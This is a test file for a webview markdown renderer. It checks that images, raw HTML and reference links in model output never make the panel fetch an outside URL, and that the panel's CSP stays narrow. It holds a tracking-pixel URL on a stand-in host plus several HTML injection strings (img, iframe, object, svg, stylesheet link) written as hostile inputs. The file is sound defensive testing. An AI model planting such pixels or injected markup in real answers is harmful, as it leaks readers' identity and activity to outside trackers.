// Model output must never make the panel fetch anything.
//
// This used to be guaranteed twice. The markdown renderer turns every image a model writes into a
// labelled link instead of an <img>, AND the webview CSP said `img-src ${cspSource} data:`, so an
// external image could not have loaded even if one slipped through.
//
// Shipping favicons meant widening that CSP to `img-src ... https:` -- the same allowance Codex
// ships -- so the second guarantee is gone, and a link in an answer now carries an <img> of its
// own. That makes "the output contains no <img>" the wrong test; it would fail on our own mark.
//
// The guarantee that actually matters, and the one held here, is narrower and exact:
//
//     NO URL THE MODEL WROTE IS EVER FETCHED BY THE PANEL.
//
// A tracking pixel in an answer -- `![](https://tracker.example/p.gif?who=victim)` -- becomes a
// button the reader may click, never a request made on render. The only <img> the renderer emits
// is our favicon, whose src is the icon service carrying the ORIGIN alone, so the pixel's path
// and query (`p.gif?who=victim`, the part that identifies the victim) never leave the machine.
//
// If one of these fails, do not relax it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { buildSync } from "esbuild";
import { fileURLToPath } from "node:url";
import { panelSrc } from "./support/webview-dom.mjs";

const here = fileURLToPath(new URL(".", import.meta.url));
const bundled = buildSync({ entryPoints: [here + "../src/markdown.ts"], bundle: true,
  format: "cjs", write: false, platform: "node" }).outputFiles[0].text;
const markdown = (() => {
  const module = { exports: {} };
  new Function("module", "exports", "require", bundled)(module, module.exports, createRequire(import.meta.url));
  return module.exports;
})();
const render = markdown.render || markdown.renderMarkdown || markdown.default?.render;

const PIXEL = "https://tracker.example/p.gif?who=victim";

test("the renderer is reachable from this test", () => {
  assert.equal(typeof render, "function",
    "if markdown.ts stopped exporting a renderer, this whole guarantee is untested -- fix the import");
});

// Every src the rendered HTML would actually fetch on render.
function loadedUrls(html) {
  return [...html.matchAll(/<img\b[^>]*\ssrc="([^"]*)"/gi)].map((m) => m[1]);
}

test("a model's image becomes a link, never an element that loads it", () => {
  const html = render(`Look: ![a chart](${PIXEL})`);
  for (const src of loadedUrls(html)) {
    assert.equal(src.includes("p.gif"), false, `the pixel's path must never be fetched: ${src}`);
    assert.equal(src.includes("who=victim"), false, `nor its query: ${src}`);
    assert.ok(src.startsWith("https://www.google.com/s2/favicons?"),
      `the only image the renderer may emit is the favicon mark, got: ${src}`);
  }
  assert.ok(html.includes("md-link"), "it should still be reachable as a link");
  assert.ok(html.includes("tracker.example"), "with its destination visible to the user");
});

test("with favicons off, a model's answer fetches nothing at all", () => {
  markdown.setFavicons(false);
  try {
    const html = render(`Look: ![a chart](${PIXEL}) and [a link](${PIXEL})`);
    assert.deepEqual(loadedUrls(html), [],
      "the setting must silence model output too, or it does not mean what it says");
  } finally {
    markdown.setFavicons(true);
  }
});

test("raw HTML in model output is inert", () => {
  for (const attempt of [
    `<img src="${PIXEL}">`,
    `<image href="${PIXEL}"/>`,
    `<video src="${PIXEL}"></video>`,
    `<iframe src="${PIXEL}"></iframe>`,
    `<object data="${PIXEL}"></object>`,
    `<svg><image href="${PIXEL}"/></svg>`,
    `<link rel="stylesheet" href="${PIXEL}">`,
  ]) {
    const html = render(attempt);
    assert.equal(/<(image|video|iframe|object|svg|link)\b/i.test(html), false,
      `model markdown must not emit a loading element: ${attempt}`);
    for (const src of loadedUrls(html)) {
      assert.ok(src.startsWith("https://www.google.com/s2/favicons?"),
        `raw HTML must not smuggle a fetch through: ${attempt} -> ${src}`);
    }
  }
});

test("a reference-style image is the same case", () => {
  for (const src of loadedUrls(render(`![x][ref]\n\n[ref]: ${PIXEL}`))) {
    assert.equal(src.includes("p.gif"), false);
  }
});

test("the CSP still forbids everything it forbade except images", () => {
  const csp = /const csp = `([^`]+)`/.exec(panelSrc);
  assert.ok(csp, "the CSP should still be one template literal in panel.ts");
  const value = csp[1];
  assert.match(value, /default-src 'none'/, "nothing is allowed by default");
  assert.match(value, /script-src 'nonce-/, "scripts stay nonce-only");
  assert.equal(/script-src[^;]*https:/.test(value), false, "widening images must not widen scripts");
  assert.equal(/connect-src/.test(value), false, "the webview still makes no fetch/XHR of its own");
  assert.match(value, /font-src \$\{webview\.cspSource\}/, "fonts stay local");
});

test("images are widened deliberately and only as far as Codex widens them", () => {
  const value = /const csp = `([^`]+)`/.exec(panelSrc)[1];
  const imgSrc = /img-src ([^;]+)/.exec(value);
  assert.ok(imgSrc, "img-src should be declared");
  assert.match(imgSrc[1], /https:/, "favicons need https: to load at all");
  assert.equal(/http:(?!s)/.test(imgSrc[1]), false, "cleartext image loads are not part of the trade");
  assert.equal(/\*/.test(imgSrc[1]), false, "a wildcard would allow schemes we never agreed to");
});
